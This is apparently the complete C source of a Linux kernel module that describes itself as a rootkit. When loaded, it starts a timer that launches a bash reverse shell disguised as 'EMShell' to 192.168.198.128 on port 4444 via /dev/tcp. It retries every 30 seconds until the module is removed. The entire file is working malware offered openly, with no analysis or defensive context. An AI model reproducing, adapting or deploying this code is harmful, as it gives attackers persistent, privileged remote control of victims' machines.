#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/timer.h>

//Metaadta about the module
MODULE_LICENSE("GPL");
MODULE_AUTHOR("70rd and team for TEC");
MODULE_DESCRIPTION("Rootkit kernel module with reverse shell named EMShell and retries");

//Timer to handle retry logic for the reverse shell
static struct timer_list retry_timer;
static int retry_interval = 30; // Retry inreval in seconds

//Command to execute (Launch Bash)
static char *shell_cmd = "/bin/bash";

//Arguments used in the shell command (reverse shell using TCP)
static char *shell_args[] = {
    "/bin/bash",
    "-c",
    "exec -a EMShell bash -i >& /dev/tcp/192.168.198.128/4444 0>&1",
    NULL
}; //Reverse shell to target IP and port

//Timer callback that tries to launche the reverse shell
static void launch_reverse_shell(struct timer_list *t)
{
    int ret;

    //Log message indicating the shell launch attempt
    printk(KERN_INFO "70rd: launching shell\n");

    //Execute User-mode helper without wawiting for it to complete
    ret = call_usermodehelper(shell_cmd, shell_args, NULL, UMH_NO_WAIT);
    
    //If the reverse shell failed, log the error code
    if (ret != 0) {
        printk(KERN_ERR "70rd: failed to launch shell, error: %d\n", ret);
    }

    // Reschedule the timer to retry after the specified interval
    mod_timer(&retry_timer, jiffies + msecs_to_jiffies(retry_interval * 1000));
}

//Called when the module is loaded into the kernel
static int __init rootkit_init(void)
{
    printk(KERN_INFO "70rd module loaded\n");

    //Set up the timer with our callback
    timer_setup(&retry_timer, launch_reverse_shell, 0);

    //Schedule the first shell launch 1 second after loading
    mod_timer(&retry_timer, jiffies + msecs_to_jiffies(1000));

    return 0;
}

//Called when the module is removed from the kernel
static void __exit rootkit_exit(void)
{
    //Ensure the timer is stopped and cleaned up
    del_timer_sync(&retry_timer);

    printk(KERN_INFO "70rd module unloaded\n");
}

//Register the init and exit functions with the kernel
module_init(rootkit_init);
module_exit(rootkit_exit);
